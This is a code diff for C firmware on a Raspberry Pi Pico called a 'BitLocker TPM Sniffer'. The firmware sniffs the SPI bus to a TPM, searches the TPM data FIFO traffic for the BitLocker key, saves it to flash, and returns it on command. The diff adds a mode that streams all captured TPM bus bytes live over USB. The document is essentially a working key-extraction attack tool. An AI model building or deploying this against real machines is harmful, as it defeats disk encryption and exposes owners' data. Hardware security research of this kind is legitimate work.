@@ -1,12 +1,12 @@
 #include <stdio.h>
-#include <cstring>      // Fix: Add this for strcmp/memset
+#include <cstring>
 #include "pico/stdlib.h"
 #include "pico/flash.h"
 #include "hardware/gpio.h"
 #include "hardware/irq.h"
 #include "flash_storage.h"
 
-// --- Hardware Configuration ---
+// Hardware Configuration
 #define PIN_SPI0_SCK  2   // SPI0 SCK (GPIO2)
 #define PIN_SPI0_MOSI 3   // SPI0 MOSI (GPIO3)
 #define PIN_SPI0_MISO 4   // SPI0 MISO (GPIO4)
@@ -17,7 +17,7 @@
 static char cmd_buffer[CMD_BUFFER_SIZE];
 static int cmd_pos = 0;
 
-// --- Core State Machine (Minimal) ---
+// Core State Machine
 static uint8_t state = 0;           // 0=op, 1=addr, 2=wait, 3=data
 static uint8_t addr_bytes = 0;
 static uint32_t address = 0;
@@ -31,13 +31,21 @@ static uint8_t window[44];
 static uint8_t win_pos = 0;
 static bool win_full = false;
 
+// Live Stream Buffer
+#define STREAM_BUFFER_SIZE 512
+// Use uint16_t to store direction flag in the top bit
+static volatile uint16_t stream_buffer[STREAM_BUFFER_SIZE];
+static volatile int stream_head = 0;
+static volatile int stream_tail = 0;
+static volatile bool stream_active = false;
+
 // Statistics
 static volatile uint32_t transactions_processed = 0;
 static volatile uint32_t keys_found = 0;
 
 bool checkAndStoreKey();
 
-// --- Byte Processing Function ---
+
 // This is called from interrupt context - must be fast!
 void processSPIByte(uint8_t mosi, uint8_t miso) {
     switch(state) {
@@ -54,7 +62,7 @@ void processSPIByte(uint8_t mosi, uint8_t miso) {
         case 1: // READ_ADDRESS
             address = (address << 8) | mosi;
             if (++addr_bytes >= 3) {
-                state = (miso & 0x01) ? 3 : 2; // Skip wait if MISO[0]==1
+                state = (miso & 0x01) ? 3 : 2;
             }
             break;
 
@@ -63,11 +71,28 @@ void processSPIByte(uint8_t mosi, uint8_t miso) {
             break;
 
         case 3: // TRANSFER_BYTE
-            data_buffer[data_count++] = is_read_op ? miso : mosi;
+            // Determine data byte based on operation type
+            uint8_t data_byte = is_read_op ? miso : mosi;
+
+            // Store in standard history buffer for key searching
+            data_buffer[data_count++] = data_byte;
+
+            if (stream_active) {
+                // Set top bit (0x8000) for Read, otherwise 0x0000 for Write
+                uint16_t entry = data_byte | (is_read_op ? 0x8000 : 0x0000);
+
+                int next_head = (stream_head + 1) % STREAM_BUFFER_SIZE;
+                // Only write if we haven't looped around and hit the tail
+                if (next_head != stream_tail) {
+                    stream_buffer[stream_head] = entry;
+                    stream_head = next_head;
+                }
+            }
+
             if (data_count >= xfer_size) {
                 transactions_processed++;
 
-                // Only process TPM_DATA_FIFO_0 (0x00D40024)
+                // Only process TPM_DATA_FIFO_0 (0x00D40024) for Key finding
                 if (address == 0x00D40024) {
                     // Append to sliding window
                     for (int i = 0; i < data_count; i++) {
@@ -183,9 +208,17 @@ void processCommand(const char* cmd) {
         win_full = false;
         printf("[*] Window reset\n");
     }
+    else if (strcmp(cmd, "stream") == 0) {
+        stream_active = !stream_active;
+        if (stream_active) {
+            printf("[*] Streaming TPM Data STARTED (RW)\n");
+        } else {
+            printf("[*] Streaming STOPPED\n");
+        }
+    }
     else {
         printf("Unknown command: %s\n", cmd);
-        printf("Available: status, getkey, erasekey, reset\n");
+        printf("Available: status, getkey, erasekey, reset, stream\n");
     }
 }
 
@@ -197,11 +230,11 @@ int main() {
     while (!stdio_usb_connected()) {
         sleep_ms(100);
     }
-    printf("\n=== BitLocker TPM Sniffer v1.0 ===\n");
+    printf("\n=== BitLocker TPM Sniffer v1.1 ===\n");
 
     uint8_t boot_key[32];
     if (flash_retrieve_key(boot_key)) {
-        printf("\n!!! STORED KEY DETECTED! Run 'getkey' to retrieve\n");
+        printf("\n[!!!] STORED KEY DETECTED! Run 'getkey' to retrieve\n");
         // Flash LED 3 times fast to indicate key present
         for(int i=0; i<3; i++) {
             gpio_put(25, 1); sleep_ms(100);
@@ -234,7 +267,7 @@ int main() {
         GPIO_IRQ_EDGE_RISE,
         true);
 
-    // Main loop: process USB commands
+    // Main loop: process USB commands and Drain Stream Buffer
     while (true) {
         int c = getchar_timeout_us(0);
         if (c != PICO_ERROR_TIMEOUT) {
@@ -246,6 +279,25 @@ int main() {
             else if (cmd_pos < CMD_BUFFER_SIZE - 1) {
                 cmd_buffer[cmd_pos++] = c;
             }
+        }
+
+        // --- Drain Stream Buffer to Console ---
+        if (stream_active && stream_head != stream_tail) {
+            printf("DATA: ");
+            while (stream_head != stream_tail) {
+                uint16_t entry = stream_buffer[stream_tail];
+                uint8_t val = entry & 0xFF;
+
+                // Check direction flag (0x8000)
+                if (entry & 0x8000) {
+                    printf("[R]%02X ", val);
+                } else {
+                    printf("[W]%02X ", val);
+                }
+
+                stream_tail = (stream_tail + 1) % STREAM_BUFFER_SIZE;
+            }
+            printf("\n");
         }
 
         // Brief sleep to let IRQs run
